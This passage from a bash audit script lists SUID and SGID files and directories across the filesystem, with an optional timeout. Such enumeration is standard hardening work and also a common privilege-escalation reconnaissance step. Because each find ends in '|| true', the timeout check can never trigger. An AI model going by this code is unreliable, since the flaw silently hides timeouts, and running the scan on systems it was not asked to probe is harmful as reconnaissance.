  rc_suid=$?
else
  find / \( -type f -o -type d \) -perm -04000 -ls 2>/dev/null || true
  rc_suid=$?
fi
set -e
if (( rc_suid == 124 )); then
  echo "SUID find: timed out (timeout reached)."
fi
echo

# List files and dirs with SGID bit set (robust, non-fatal)
pretty_run_header "find files/dirs with SGID bit set (perm 02000)"
set +e
if [[ -n "$timeout_bin" ]]; then
  "${timeout_bin}" "${timeout_arg}" find / \( -type f -o -type d \) -perm -02000 -ls 2>/dev/null || true
  rc_sgid=$?
else
  find / \( -type f -o -type d \) -perm -02000 -ls 2>/dev/null || true
  rc_sgid=$?
fi
set -e
if (( rc_sgid == 124 )); then
  echo "SGID find: timed out (timeout reached)."
fi
echo

# End of script
